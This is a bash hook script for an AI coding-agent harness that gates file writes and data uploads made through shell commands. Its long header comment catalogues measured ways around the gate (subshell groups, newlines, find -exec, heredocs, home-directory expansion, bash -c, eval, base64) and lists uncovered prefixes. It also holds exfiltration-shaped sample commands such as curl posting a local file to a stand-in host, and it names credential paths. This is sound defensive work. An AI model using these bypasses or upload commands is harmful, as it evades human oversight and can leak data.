#!/usr/bin/env bash
# Phase #6: gate file writes performed THROUGH Bash, which bypass the Write/Edit
# gate stack (pre-write-dispatch + security + validation fire only on the
# Write/Edit/NotebookEdit TOOLS, never on Bash). Without this, an agent in work
# mode can `echo x > src/foo.py` before plan approval, or write secrets to a
# credential path, entirely ungated.
#
# Two checks per redirect/copy target extracted from the command:
#   1. CREDENTIAL (any mode, path-only, server-independent): deny writes to
#      secret paths. The classifier is writ.session.gates._is_credential_path
#      (imported -- SINGLE SOURCE, no drift; a minimal inline fallback runs only
#      if the package import fails). The file is NEVER opened (org credential ban).
#   2. WORK-GATE (EVERY target, in-repo and out): feed the abspath to the same server
#      gate the Write tool uses (POST /session/<id>/can-write -> _can_write_check), so a
#      Bash write is decided exactly as a Write to the same path. Out-of-repo targets are
#      fed too, and that is the point: the Write tool's gate confines writes to the
#      approved project (writ/session/project_boundary.py), so skipping them here made
#      that boundary enforceable on one of the two write doors, measured as a Bash write
#      to a path the Write tool had just refused. This step refuses nothing by itself and
#      decides nothing: the verdict is whatever _can_write_check returns for that path, so
#      both doors now agree by construction. Note what the OS temp dir and this project's
#      own ~/.claude memory dir get from the boundary predicate: it SUPPRESSES ITS OWN
#      REFUSAL for them, which is not an allow. The work gate still runs, so a pre-approval
#      write to /tmp is refused with [ENF-GATE-PLAN] on BOTH doors. That is the accepted
#      cost of parity (C1 in this cycle's plan); the remedy, a scratch-zone allow arm in
#      _check_work_gate, is deferred to its own cycle.
#
# Redirect detection is QUOTE-AWARE: shlex(posix=False) keeps quote chars on
# tokens, so a quoted '>' (e.g. `grep '>' app.pem`) is NOT treated as an operator;
# and `[[ ]]` / `[ ]` / `test` / `(( ))` comparison/arith spans are suppressed.
#
# A THIRD write vector, added after an audit reproduced it live: an inline-code
# interpreter (`python3 -c "open('src/x.py','w')..."`) matches none of the shell write
# forms, so it produced no target, reached no gate and left no audit row -- a silent
# pre-plan write. Such a segment now has its ARGUMENTS scanned for project-file paths,
# and every path found is fed to the same work-gate decision below. Narrow by design:
# the interpreter source is never classified as reading or writing (that is a parser
# arms race), so a read-only one-liner naming a project file is gated too. See the
# INLINE_INTERPRETERS block in the extractor for the exact forms covered and missed.
#
# COVERAGE LIMIT (no silent caps): only common LITERAL vectors are detected
# (`>`/`>>`/`2>`/`&>`/`>|`, `tee`, `dd of=`, `cp`/`mv`/`install` dest incl. -t,
# `sed -i`, and the inline-interpreter forms above). Obfuscated writes --
# var-indirection, eval/base64, a path assembled from pieces -- WILL evade. This
# narrows the hole, it does not seal it.
#
# A WRAPPER PREFIX in front of one of those vectors is stepped over by verb_at, not by
# each consumer, so `timeout 5 cp seed.txt src/y.py`, `nice -n 5 tee src/y.py` and
# `ls | xargs sed -i s/a/b/ src/y.py` are gated exactly as the unprefixed forms are; see
# WRAPPERS in the extractor for the sixteen prefixes and their flag tables. What that
# does NOT reach is a body that arrives as ONE QUOTED STRING: `bash -c "cp seed.txt
# src/y.py"` and `watch -n1 'cp seed.txt src/y.py'` both emit the empty set, because the
# quoted command is a single token and no consumer arm matches it. The uncovered-prefix
# block in the egress limit below carries the full residue.
#
# A CONTROL OPERATOR WITH NO SPACE IN FRONT OF IT USED TO EVADE, and the honest version
# of that is: the CATEGORY was disclosed here (as "glued `foo>bar`") and THIS INSTANCE
# was not. shlex(posix=False) forces whitespace_split, so `echo x > .env; ls` tokenized
# as ['echo','x','>','.env;','ls']: the target read as `.env;`, whose BASENAME is not a
# credential, and the command after the operator never reached command position, where
# verb_at is the only thing that looks. Measured live in work mode with both gates
# approved: `echo x > .env ; ls` denied and `echo x > .env; ls` was ALLOWED SILENTLY.
# Tokens are now re-split on `;`, `&&`, `&`, `|` and `||` before segmentation
# (writ.session.bash_tokens.split_control_operators, mirrored in the extractor below),
# with quoted spans and redirect fd-dups (`2>&1`) excepted.
#
# ── Same seam, third instance: A WRITE HIDDEN INSIDE A SHELL GROUP ──────────
# Two mechanisms, both measured, both closed as of this cycle.
#
# NO ROW AT ALL: verb_at resolved seg[0] and stepped over a prefix only by membership in
# WRAPPERS, so a group character that OCCUPIED verb position or was GLUED to it became
# "the verb" and matched none of the cmd0 arms. Measured through this extractor before the
# fix: `(cp seed.txt src/y.py)`, `( cp seed.txt src/y.py)` and `{ cp seed.txt src/y.py; }`
# each emitted the EMPTY SET, while the bare `cp seed.txt src/y.py` emitted
# `local <cwd>/src/y.py`. Reserved words failed for a second reason: the `;` split already
# isolates `then` and `do` ALONE in seg[0], and neither is in WRAPPERS, so the write in
# `if true; then cp a src/x.py; fi` was invisible too. BOTH substitution syntaxes measured
# the same way, which is why they are one case and not a subshell fix plus a guess:
# `$(cp seed.txt src/y.py)` and `` `cp seed.txt src/y.py` `` each emitted the empty set as
# well. verb_at now steps over GROUP_VERB_TOKENS (bash's group openers plus the reserved
# words a command list follows) and strips a glued `(`, `$(` or backtick off the verb,
# reusing its own membership-test precedent rather than inventing a second shape. `[`, `[[`
# and `test` are deliberately NOT stepped: they ARE the verb, and the seg_is_test redirect
# suppression depends on it. A glued `{` is NOT stripped, and that is EXECUTED rather than
# read: `bash -c '{echo hi; }'` is a syntax error (`syntax error near unexpected token
# `}'`) while `bash -c '{ echo hi; }'` prints hi, so the glued spelling does not parse at
# all and cannot be a bypass vector.
#
# A CORRUPTED VALUE, WHICH COST IN BOTH DIRECTIONS: the redirect path never consults the
# verb, so a redirect inside a group WAS seen, with its target keeping the group's trailing
# closer. `(echo x > src/y.py)` yielded `<cwd>/src/y.py)`, which defeats NONFILE (an
# exact-string set) and defeats the basename-driven credential classifier exactly as
# `.env;` did. The SAME corruption refused ordinary work: `(echo x > /dev/null)` emitted
# the row `outside /dev/null)`, because `/dev/null)` is not the NONFILE member
# `/dev/null` and resolves as an out-of-repo absolute path, so every `(cmd > /dev/null)`
# was work-gated. Normalized in ONE place, at the head of the classification loop where
# every vector's targets are already collected and none is yet classified, never per
# consumer: an UNBALANCED trailing `)` is counted off (`src/note(1))` becomes
# `src/note(1)`, so a filename holding a BALANCED pair survives), and a trailing BACKTICK
# comes off on PARITY, since a backtick is its own closer and "more closers than openers"
# is undefined for it. A closer that sits ALONE on its own token (`( cp a src/y.py )`) is
# not a value to normalize at all but SYNTAX, so GROUP_CLOSER_TOKENS drops it where
# segments are built; before this cycle a bare `)` was a valid positional argument to
# every write arm, measured as the phantom row `local <cwd>/)` from
# `( echo x | tee src/y.py )`. END TO END before the fix, work mode, BOTH gates approved:
# `cp seed.txt <secret>` denied with [SEC-CREDENTIAL-WRITE] while
# `(cp seed.txt <secret>)` and `(echo x > <secret>)` were ALLOWED SILENTLY.
#
# ACCEPTED COST of the normalization: a file whose name really ends in an UNBALANCED `)`
# is gated under the name without it. Fail-closed and cosmetic, because the row still
# exists and a credential named `.env)` normalizes INTO a deny rather than out of one.
#
# THE TOKENIZER FIX IS RULED OUT, so the next reader does not reach for it: making `(` or
# `)` a token boundary in split_control_operators would break the arithmetic depth counter
# below (which counts the LITERAL `((` and `))` inside ONE token), the process-
# substitution guard in redir_target (`rest.startswith("(")`), and `$(...)`, which would
# be blown open into unrelated top-level segments. See
# docs/adr/ADR-bash-control-operator-tokenizer.md.
#
# WHAT REMAINS IN THAT FAMILY, so the fix is not read as wider than it is:
#   * `foo>src/x.py` -- an operator glued to the verb IN FRONT of it, a different
#     mechanism with no token boundary to recover. The `&>` spelling (`foo&>src/x.py`)
#     IS seen, because an `&` in that position can only start a redirect.
#   * a substitution inside an ASSIGNMENT: `out=$(cp a src/y.py)` matches ASSIGNMENT on
#     `out=$(cp`, so verb_at steps the whole token and resolves `a` as the verb.
#   * the FIRST command of a `case` branch: `case $x in a) cp a src/y.py;; esac` leaves
#     `a)` in verb position, and stepping over it would need pattern-list parsing.
#   * a FUNCTION DEFINITION body: `f() { cp a src/x.py; }` resolves its verb to `f()`.
#     OUT OF SCOPE rather than missed: the body writes only when the function is CALLED,
#     so the definition is not itself a write, and the call resolves to the verb `f`,
#     which is the wrapper-script limit already disclosed above.
#
# ── Same seam, fifth instance: A NESTED COMMAND INSIDE AN ARGUMENT LIST ─────
# find's exec family carries a whole command as ARGUMENTS, ended by `\;`, `';'`, `";"` or
# `+`. verb_at returns ONE verb per segment and returns at the first non-WRAPPERS name, so
# cmd0 for the whole segment was `find`, matching none of the four write arms and none of
# the egress verbs. MEASURED through this extractor before the fix, WRIT_CWD=/proj, every
# one of them SILENT:
#
#   find . -name x -exec cp {} src/y.py \;                            -> set()
#   find . -name x -exec cp {} src/y.py ';'                           -> set()
#   find . -name x -exec cp -t src {} +                               -> set()
#   find . -name x -execdir cp {} src/y.py \;                         -> set()
#   find . -name x -ok cp {} src/y.py \;                              -> set()
#   find . -name x -okdir cp {} src/y.py \;                           -> set()
#   find . -name x -exec tee src/y.py \;                              -> set()
#   find . -name x -exec sed -i s/a/b/ src/y.py \;                     -> set()
#   find . -name x -exec curl -d @src/a.txt https://example.invalid \; -> set()
#
# Controls, same run: `find . -name x -print` was silent (correct), `find . -name x |
# xargs cp -t src` already yielded `local /proj/src` (cycle P), and `find . -name x -exec
# cp {} src/y.py \; ; cp seed.txt src/z.py` yielded ONLY `local /proj/src/z.py`, which is
# what proved the segmentation around the construct was intact and only the nested command
# was lost.
#
# THE FIX IS ONE SPLICE, and where it sits is the whole design: each nested span is
# appended to `segments` as an ADDITIONAL entry (piped flag FALSE) before any pass runs,
# so the write loop resolves cmd0 = cp, the egress loop resolves verb = curl, and the
# interpreter pass sees a nested `python3 -c`, with NO new arm anywhere and no change to
# verb_at. The two rejected alternatives are recorded because both look reasonable: a
# fifth cmd0 arm would duplicate all four arms' destination logic and would not reach
# egress at all, and refactoring the per-segment body into a shared function would rewrite
# the code path every existing test runs through for no extra coverage.
#
# FOUR FLAGS, which is two more than this file used to name. `-ok` and `-okdir` prompt
# before each command and then RUN it. Both were measured silent above and both were named
# NOWHERE: not here, not in the ADR, not in a test. The earlier disclosure undercounted the
# family, and a disclosure that misstates the size of a hole is what stops the next reader
# re-examining it.
#
# THE BATCH FORM CANNOT CARRY A POSITIONAL DESTINATION, and find enforces that itself.
# EXECUTED against findutils 4.9.0: `find . -maxdepth 0 -name __nomatch__ -exec cp {} dest
# +` fails with "find: missing argument to `-exec'" (exit 1), because `{}` must be the
# trailing argument under `+`. So under `+` a destination is reachable only as a FLAG VALUE
# (`cp -t DIR {} +`), and no detector for `cp {} dest +` exists here, because that command
# can never run. The `;` family has no ordering constraint, so a destination may sit
# anywhere in the nested argument list.
#
# ACCEPTED COST, stated rather than discovered: `{}` is find's placeholder, not a path, and
# the two brace discards elsewhere in this file (CODE_PUNCT in token_literals, the brace
# skip in scan_tokens) are on the INTERPRETER path only, not on the cmd0 write arms. A
# spelling that puts the placeholder in DESTINATION position (`-exec tee {} \;`,
# `-exec sed -i s/a/b/ {} \;`) therefore emits a row naming the placeholder, resolved under
# the cwd even when find's search root is elsewhere. It is fail-closed and strictly better
# than the silence it replaces: a real in-place bulk edit now reaches the work gate instead
# of no gate at all, and the only thing wrong is the TEXT of a path that no single file can
# be named for. Both rows are pinned as tests. The two alternatives are recorded because
# each is worse: a global brace skip at the normalization point would also turn a real
# `echo x > src/{a}.py` into silence, and dropping `{}` out of the span makes the sed arm
# read its SCRIPT as the file and leaves `tee {}` with no argument at all. Resolving find's
# search root into the placeholder is a separate mechanism (find's path operands precede
# its expression and may repeat) and is deliberately not attempted.
#
# DELETION STAYS OUT, by the recorded ruling in the irreversible-destruction block below
# ("rm -rf, DROP TABLE and TRUNCATE are OUT OF SCOPE on purpose"): `find ... -exec rm {}
# \;` and `find ... -delete` are silent after this fix too, because `rm` matches no cmd0
# arm and `-delete` carries no nested command. Both are pinned, so the closure is not read
# as smuggling deletion into scope.
#
# ── Same seam, sixth instance: A NEWLINE, WHICH shlex THROWS AWAY ───────────
# `CONTROL` carried a `"\n"` member that matched NOTHING, because shlex.split treats a
# newline as ordinary whitespace and never emits it as a token, so a multi-line command was
# ONE segment whose verb was the first line's. MEASURED through this extractor before the
# fix, WRIT_CWD=/proj:
#
#   "ls\ncp seed.txt src/x.py"                       -> set()                    INVISIBLE
#   "ls ; cp seed.txt src/x.py"                      -> local /proj/src/x.py      control
#   "ls\necho y > src/x.py"                          -> local /proj/src/x.py      VISIBLE
#   "ls\ncurl -d @src/a.txt https://example.invalid" -> set()                    INVISIBLE
#
# So a newline hid every VERB-DEPENDENT write and every egress row, and hid no redirect,
# because the redirect loop never consults the verb. Same shape as the group-construct gap.
#
# THE REASON THIS PASSAGE USED TO GIVE WAS HALF RIGHT, and the correction is the point of
# the cycle. It said porting writ-worktree-safety.sh's pre-split "needs the heredoc
# stripper too or a document ABOUT a write becomes a refusal". True. What it did not know is
# that THE REFERENCE STRIPPER IS ITSELF DEFECTIVE, in two ways, both EXECUTED on a verbatim
# copy rather than read:
#   1. NO SAME-LINE BOUNDARY. It consumed tokens from immediately after the opener and
#      scanned forward for the terminator, so `cat <<'EOF' > docs/notes.txt` lost its REAL
#      destination along with the phantom from its body: 11 tokens in, 1 out.
#   2. IT DELETED COVERAGE THIS FILE HAS TODAY. A stdin-fed interpreter scans the WHOLE
#      token list (see stdin_interpreter below), which is how a `python3 - <<'EOF'` body is
#      seen right now; stripping the body removes the only place that source text appears.
# A verbatim port would have been a NET LOSS. Neither defect is observable in the worktree
# hook (no redirect vector, and its one heredoc test asserts only the worktree verdict), so
# both had zero coverage there.
#
# THE FIX IS THREE PARTS, shared through the mirror block so ONE repaired copy serves both
# hooks: the quote-aware pre-split (reused unchanged, it was correct), the stripper with a
# SAME-LINE BOUNDARY (the body is the run from the FIRST SEP after the opener, so the
# opener's own line survives, and the OPENER TOKEN survives because it is the only marker of
# the no-dash `python3 <<'DELIM'` stdin form), and the stdin scan kept on the UNSTRIPPED
# stream. The regex opener test became string operations because writ/session/bash_tokens.py
# imports NOTHING on purpose and the mirror test execs the block bare.
#
# RESIDUE, each MEASURED through this extractor with WRIT_CWD=/proj and each leaving an
# EXTRA row rather than losing a verdict on a command that runs:
#   * a body line naming the terminator word MID-LINE ends the strip early, because this is
#     a token scan and bash's rule is a LINE rule, so the remaining body tokens become
#     arguments of the opener line's command and the phantom returns: `cat <<'EOF' >
#     docs/notes.txt` over `this EOF is not a terminator > src/x.py` emits BOTH rows.
#   * TWO openers on one command (`cat <<'A' <<'B'`) honor only the FIRST terminator, so the
#     second body is judged as commands: both rows again.
#   * an opener GLUED to what follows it (`<<'EOF'>f`, `<<EOF;`) is not recognized as an
#     opener at all, because stripping runs on RAW shlex tokens ahead of
#     split_control_operators. That ordering is deliberate: a body line must never be
#     re-split, or it can contribute a segment. MEASURED consequence, stated because it cuts
#     the other way: `cat <<'EOF'>docs/notes.txt` over a body holding `cp seed.txt src/x.py`
#     emits `local /proj/src/x.py` ALONE. The body line is judged (the extra row), and the
#     opener's OWN destination is not recovered, because REDIR cannot match a token starting
#     with `<` and the splitter deliberately does not split `>`. That is the `foo>src/x.py`
#     limit already disclosed above, reached through an opener instead of a verb.
# See docs/adr/ADR-bash-control-operator-tokenizer.md, cycle R amendment.
#
# ── Same seam, seventh instance: THE EXPANSIONS A SHELL PERFORMS BEFORE THE WRITE ──
# Every vector above collects a write target as a WORD, and the classification loop below
# joins that word under cwd. Nothing performed the expansions a real shell performs first,
# so a word that LOOKS relative and really lands in the user's home read as in-project.
# The gate did not fail to answer: it answered `local` for a path nothing would write to,
# and the audit row named that fictional path too, which is what makes a later reviewer
# read green. MEASURED through this extractor with WRIT_CWD=/proj and HOME=/home/u, before
# the fix and then after it, against a real `bash -c 'printf "%s" WORD'` as the oracle for
# every spelling (`~NAME` is an EXISTING login name on the measuring host, resolved through
# the password database; an unknown one correctly stays literal on both sides):
#
#                             BEFORE                  AFTER                 shell writes
#   cp README.md ~/x          local /proj/~/x         outside /home/u/x     /home/u/x
#   cp README.md ~NAME/x      local /proj/~NAME/x     outside /home/NAME/x  /home/NAME/x
#   cp README.md ~            local /proj/~           outside /home/u       /home/u
#   cp README.md $HOME/x      local /proj/$HOME/x     outside /home/u/x     /home/u/x
#   cp README.md ${HOME}/x    local /proj/${HOME}/x   outside /home/u/x     /home/u/x
#   cp README.md "$HOME/x"    local /proj/$HOME/x     outside /home/u/x     /home/u/x
#   dd if=/dev/zero of=~/x    local /proj/~/x         outside /home/u/x     /home/u/x
#
# and the four that were already right, which the fix must NOT move:
#
#   cp README.md '~/x'        local /proj/~/x         local /proj/~/x       ~/x
#   cp README.md "~/x"        local /proj/~/x         local /proj/~/x       ~/x
#   cp README.md '$HOME/x'    local /proj/$HOME/x     local /proj/$HOME/x   $HOME/x
#   cp README.md src/~/x      local /proj/src/~/x     local /proj/src/~/x   src/~/x
#
# The same seventeen spellings were driven through the WHOLE hook with a PreToolUse
# envelope, in work mode with both gates approved and project_root set: the seven rows
# above flip from a SILENT ALLOW to `[ENF-PROJECT-BOUNDARY]`, the ten correct ones are
# unchanged tag for tag, and `$NOPE_UNSET/x` flips from a silent allow to an ask.
#
# EXPANSION RUNS AT COLLECTION, NOT AT CLASSIFICATION, and that placement is forced rather
# than preferred. shlex(posix=False) keeps the quote characters ON each token, so quoting
# IS still known while a segment is being read; the two collection sites below used to
# hand `dequote`'s OUTPUT forward, and dequote DESTROYS that evidence. By the classification
# loop, `"$HOME/x"` and `'$HOME/x'` are the same seven bytes and their correct answers are
# OPPOSITE, because bash expands the first and not the second. No code reading those bytes
# can separate them, so a fix placed there is wrong in one direction by construction:
# either the six rows above stay open, or these four spellings, which a real shell leaves
# ALONE and which really do land in the project, become false refusals:
#
#   "~/x"        '~/x'        '$HOME/x'        src/~/x
#
# A false refusal on a human-oversight boundary is the worse failure of the two: it trains
# the user to wave the gate through. So `expand_word` (beside dequote, below) takes the RAW
# token, and `raw_targets` carries (value, unresolved) PAIRS forward. The classification
# line itself is untouched: an expanded `~/x` is already absolute, so its existing
# is-absolute branch does the right thing with no edit at all.
#
# THE ASSIGNMENT RULE IS A SHAPE RULE, and `dd of=` is why it is not academic here. A tilde
# expands after an `=` only when the text before the `=` is a valid shell NAME
# ([A-Za-z_][A-Za-z0-9_]*), and then again after every `:` in that same word. All six rows
# were measured, not read off a manual: `of=~/x`, `foo_1=~/x` and `a=b:~/x` expand, while
# `fo-o=~/x`, `2bad=~/x` and `--opt=~/x` do NOT, which is also why `cp
# --target-directory=~/x` is correct today and stays correct. `dd of=` is a write form this
# gate collects and slices, so the expanding half is a real bypass. `NAME+=~/x` expands in
# a real shell too and is NOT expanded here; it reaches no collected target (`of+=` is not
# a dd operand, and any other assignment-shaped word stays a relative path even expanded),
# so it is disclosed rather than handled.
#
# A LOGIN NAME MAY CONTAIN A DOT. `~name` resolves through the password database, and the
# charset is [A-Za-z_][A-Za-z0-9_.-]* rather than a naive [A-Za-z0-9_] identifier, because
# a dotted login name is one of the measured bypasses and the naive spelling leaves exactly
# that spelling open. An unknown name stays LITERAL, which is what bash does, so that is
# correct rather than merely safe.
#
# AN UNRESOLVED VARIABLE ASKS. It is neither a deny nor a silent allow, and this is the
# file's OWN precedent rather than a new policy: the egress pass already ruled that when a
# flag makes the apparent host stop being evidence, "the safe answer to 'cannot be trusted'
# is the prompt, not silence". `$NOPE/x` expands to `/x`, the filesystem ROOT, in a real
# shell, and this hook cannot know whether an arbitrary name is set in the shell that will
# run the command. Denying refuses work that may be legitimate; leaving it literal is not
# neutral, because the gate would AFFIRMATIVELY classify `<cwd>/$NOPE/x` as in-project and
# write an audit row naming a path nothing wrote to. So such a target emits an `unknown`
# row and NO `local`/`outside` row, and the bash arm below turns it into one confirmation
# naming the variable. The flag is computed INSIDE expand_word, where quoting still exists:
# recomputing it at the classification point would raise a false ask on the legitimate
# in-project `'$NOPE/x'`, which is the same trap as above with the same answer. The check
# is ordered AFTER the credential and gate-state arms, so `cp seed.txt $NOPE/.env` still
# DENIES rather than asking.
#
# WHAT IS DELIBERATELY NOT EXPANDED, each a different mechanism this gate has no theory
# about, and each leaving the word LITERAL (so it classifies in-project): command
# substitution in both syntaxes, process substitution, arithmetic expansion, brace
# expansion, pathname expansion (globbing), the parameter-expansion OPERATOR forms
# (${VAR:-x}, ${VAR#p} and relatives), positional and special parameters, and the three
# directory-stack tildes named in the machine-readable block below. None of them raises the
# unknown ask either: an ask worded for "an unset variable" about a mechanism that is not
# one misnames what is unknown, which is worse than admitting the gap.
#
# `~+` is $PWD, which IS this hook's own cwd, so expanding it or not gives the same
# classification and there is nothing to close. `~-` is $OLDPWD and `~N` is the directory
# stack: both are state of the INVOKING shell that this hook does not have and cannot
# reconstruct, and inventing a value for them is how a wrong refusal gets built.
#
# A MID-PATH TILDE (`src/~/x`) IS NOT RESIDUE and is deliberately absent from that block:
# bash does not expand it either, so the gate and the shell AGREE, which is why that
# spelling is correct today and must stay correct. The same goes for a tilde whose word
# opens with a quoted run before the `=`-or-`:` offset (`a="b:"~/x`): the offsets are
# computed on the raw word, so the tilde stays literal there, which is the miss direction
# and reaches no collected target.
#
# UNEXPANDED FORMS BEGIN (names only; the reasons are in the prose above)
# tilde-pwd, tilde-oldpwd, tilde-dirstack
# UNEXPANDED FORMS END
#
# See docs/adr/ADR-bash-control-operator-tokenizer.md, cycle T amendment.
#
# ── Second vector: EGRESS ────────────────────────────────────────────────────
# The file name still says "write" because renaming it would churn hooks.json, the
# generated docs/reference/hooks.md, the matcher-wiring test and the docs for no
# behavioral gain. The real scope is two vectors: writes IN, and egress OUT.
#
# A Bash command that SENDS local data off this machine is answered with
# permissionDecision "ask" (a user confirmation naming the destination host and what
# appears to be sent), mode-independently and server-independently like the credential
# deny above. Detected shapes: curl/wget carrying a payload (or a POST/PUT/PATCH fed by
# a pipe or an input redirect), scp/rsync whose DESTINATION is remote, sftp, `gh gist
# create`, and nc/ncat/netcat/telnet fed from stdin or a redirect. `git push` and
# payload-free GET fetches are deliberately NOT gated.
#
# The ask branch sits AFTER the work-gate loop so deny outranks ask: a credential
# write, a gate-state write and a pre-plan project write all refuse outright, and only
# a command with nothing stronger against it reaches a confirmation. The egress pass
# runs INSIDE the single python extractor below, so a non-egress command pays zero
# extra process spawns and an egress-shaped one pays the same one spawn as a write.
#
# The allowlist (writ/config.py get_egress_allow_hosts) compares the HOST ONLY, port
# ignored, so the Writ daemon passes on any port -- a deliberate small widening over
# "host:port". Built-ins: localhost, 127.0.0.1, ::1, [::1] and $WRIT_HOST; extras from
# writ.toml `[egress] allow_hosts` and $WRIT_EGRESS_ALLOW_HOSTS. The allowlist is
# BYPASSED (the prompt fires anyway) when the command also carries something that moves
# the real TCP destination off the URL's apparent host -- --resolve, --connect-to, -x,
# --proxy and the socks variants, or a leading http_proxy= / https_proxy= / all_proxy=
# assignment -- because an apparently-local POST can be pointed anywhere. The apparent
# host is then labelled "(apparent only)" in the reason, and the reason names the
# overriding flag or assignment (assignments by NAME plus resolved proxy host only, so a
# proxy URL's credentials never reach the retained audit reason).
#
# The verb is resolved by verb_at(), NOT seg[0]: leading NAME=value assignments, the
# wrapper prefixes (command / env / exec / nohup / time, sudo / doas, as of cycle P
# timeout / nice / stdbuf / watch / setsid / xargs, and as of cycle S flock / ionice /
# chrt) with their own flags and, for the three that take one, their own positional
# argument (timeout's duration, flock's lock target, chrt's priority), and a leading
# backslash all sit in FRONT of the real command. One helper serves
# both the egress pass and the write extractor, so `FOO=1 tee f`, `env FOO=1 cp a b` and
# `sudo cp a b` are gated as writes for the same reason `FOO=1 curl -d @f https://host`
# prompts. sudo/doas are parsed STRICTLY, mirroring sudo's real short-option grammar for
# the KNOWN letters -- bundles and glued values both resolve, so `sudo -u deploy scp f
# h:/p`, `sudo -udeploy curl ...` and `sudo -nHudeploy curl ...` are all covered. Only an
# UNKNOWN option letter or long option bails to no-detection, rather than risk a prompt
# naming the wrong verb; a bailed segment's plain redirects are still extracted.
#
# COVERAGE LIMIT, egress (same honesty as the write block above): only literal,
# tokenizable command shapes are seen. Obfuscation WILL evade -- base64/gzip piped into
# an interpreter, `python3 -c` with urllib, `node -e`, heredoc-fed uploads,
# variable-indirected URLs and hosts,
# the glued forms the write block above still names (an operator glued to the verb in
# front of it, a substitution inside an assignment, a `case` branch's first command; a
# control operator glued to the token BEFORE it, and a shell keyword or group opener in
# verb position, are both split/stepped as of the cycles above and are no longer in this
# list -- `(curl -d @f https://host)` now resolves the verb `curl` and asks, with the
# destination host carrying a cosmetic trailing `)` that can only ADD a prompt, never
# remove one),
# and any
# verb not named above (ftp, aws s3 cp, rclone, git remotes over http).
#
# STILL-UNCOVERED PREFIXES. This passage used to name timeout, stdbuf, nice, setsid,
# xargs and watch here, "because each takes non-flag positional arguments of its own
# before the command and a naive skip would mis-read the verb". That reason was true of
# exactly ONE of the six. All six are now WRAPPERS entries with STRICT flag tables, and
# `timeout`'s single duration positional is stepped by WRAPPER_POSITIONALS with a shape
# check; the other five have no positional at all. Cycle S closed three more the same
# way, flock / ionice / chrt, each MEASURED silent on both halves first (the rows are
# beside their tables in the extractor); flock's mandatory lock target and chrt's priority
# joined WRAPPER_POSITIONALS, ionice takes no positional of its own. What remains
# uncovered, with the reason for each, and then the names alone in a machine-readable
# block:
#
#   fd --exec / fd -x       The SAME nested-command mechanism under another tool's flag
#                           spellings, which NESTED_CMD_FLAGS does not carry. NOT
#                           MEASURED, so this is a stated suspicion and not a closed
#                           hole. (find's own four command-running primaries, `-exec`,
#                           `-execdir`, `-ok` and `-okdir`, WERE the fifth instance of
#                           this seam and are CLOSED by the nested-command splice
#                           documented above, so they are no longer named in the block
#                           below.)
#   sh -c / bash -c / eval  Behavior deliberately unchanged; the real reason is the
#                           false-positive cost of gating every `bash -c`, not the false
#                           one this file used to give. See the NOT COVERED note beside
#                           INLINE_INTERPRETERS for the measured spellings.
#   coproc / function       Both take an OPTIONAL NAME, which is not distinguishable from
#                           the command; see GROUP_VERB_TOKENS.
#   unbuffer / parallel / fd
#                           NOT INSTALLED on this machine, so their gaps are UNMEASURABLE
#                           here rather than merely unmeasured, and no table is added on
#                           inference. (fd is also the nested-command mechanism under
#                           another tool's flag spellings, named above.)
#   script / su -c / strace Further transparent prefixes with no table here yet. Each is a
#                           table away, not a mechanism away; none is measured.
#
# Four per-spelling MISSES the tables knowingly accept, each pinned as a silence in
# tests/test_bash_wrapper_prefix_gate.py rather than left to be rediscovered: the obsolete
# numeric `nice -5 cp ...` (an unknown option letter, so it bails), the glued
# optional-argument short `xargs -iX cp {} src/y.py` (unknown letter after `-i`), any
# prefix whose command arrives as ONE QUOTED STRING (`watch -n1 'cp seed.txt src/y.py'`),
# and flock's own `-c/--command` form (`flock /tmp/l.lock -c 'cp seed.txt src/y.py'`),
# which is that same quoted-string class: the lock target is stepped, `-c` then sits in
# verb position, and the whole body is one token. They are spellings of COVERED prefixes,
# so they are deliberately NOT in the block below: the block is names only, and a name
# there must not also be a WRAPPERS key.
#
# UNCOVERED PREFIXES BEGIN (names only; the reasons are in the prose above)
# sh -c, bash -c, eval, coproc, function, fd --exec, fd -x,
# unbuffer, script, parallel, su -c, strace
# UNCOVERED PREFIXES END
#
# The worktree gate carries its OWN prefix set (writ-worktree-safety.sh) and it was NOT
# grown this cycle: its parsing is permissive-only by design, it has no positional
# mechanism, and the prefix evasion there is INFERRED rather than measured, so
# `timeout 5 git worktree remove x` is an unmeasured suspicion, not a closed hole.
#
# Still-uncovered destination overrides, because they are not command
# tokens at all: an INHERITED proxy environment (as opposed to a leading assignment on
# the command itself, which is covered), wget's `-e use_proxy=`, and endpoints read from
# a `-K`/`.curlrc` config file. A payload whose
# path is credential-shaped is CALLED OUT in the reason but still only asks: the policy
# for egress is confirmation, not refusal. Also shared with the write vector: the
# missing-session-id early exit below swallows egress too, which is kept for parity
# rather than changed here. Known interaction: a pytest command that happens to contain
# an egress token (`-k "curl and post"`) matches the first case arm and therefore skips
# the venv interpreter swap, exactly as `pytest > log` already does.
#
# Hook type: PreToolUse (matcher: Bash). Exit: always 0 (deny via emit_deny JSON,
# confirm via emit_ask JSON).
set -euo pipefail
HOOK_DIR="$(cd "$(dirname "$0")" && pwd)"
WRIT_DIR="$(cd "$HOOK_DIR/../.." && pwd)"
source "$WRIT_DIR/bin/lib/common.sh"
hook_instrument "writ-bash-write-gate"

load_hook_env
SESSION_ID="$HOOK_SESSION_ID"
[ -z "$SESSION_ID" ] && exit 0

CMD="$HOOK_COMMAND"
[ -z "$CMD" ] && exit 0

# Every `case` guard below asks whether the raw command TEXT contains a substring, and
# most of them want the verb followed by ONE literal space. A shell asks a different
# question: whether the first WORD of a command resolves to that verb. The two disagree on
# every spelling where the separator is not a single literal space, or where a quote
# character sits between the letters and the separator, and each guard's default arm is
# `exit 0`, so a disagreement is a SILENT ALLOW. `CMD_N` is a normalized COPY, computed
# once here, that the five fail-open sites below match against instead. The raw `CMD`
# survives untouched, because four other sites REQUIRE it and each says so at its own arm.
#
# Three pieces, each settled on its own:
#   1. TAB AND NEWLINE BECOME A SPACE. Space, tab and newline are exactly bash's default
#      IFS whitespace, which is why the class stops there: carriage return, vertical tab
#      and form feed are NOT token separators to bash, so translating them would model a
#      shell that does not exist. Same bracket-class idiom as bin/lib/common.sh.
#   2. QUOTE CHARACTERS ARE REMOVED IN PLACE, with no space inserted, which is what a
#      shell does for adjacent quoting: `"cp" x` and `auto-approve"-"gate` collapse the
#      way the shell collapses them. The class is spelled `[$'\x22\x27']` because the
#      code points are unambiguous at a glance; the plan claimed `[\"\']` would also
#      strip BACKSLASHES, and REVIEW MEASURED THAT CLAIM FALSE: in bash 5.2.21 both
#      spellings produce byte-identical output on inputs carrying backslashes,
#      apostrophes and Windows paths. The spelling is a readability choice, nothing more,
#      and the wrong reason is recorded here rather than quietly dropped because it was
#      stated confidently in three files before anyone ran it.
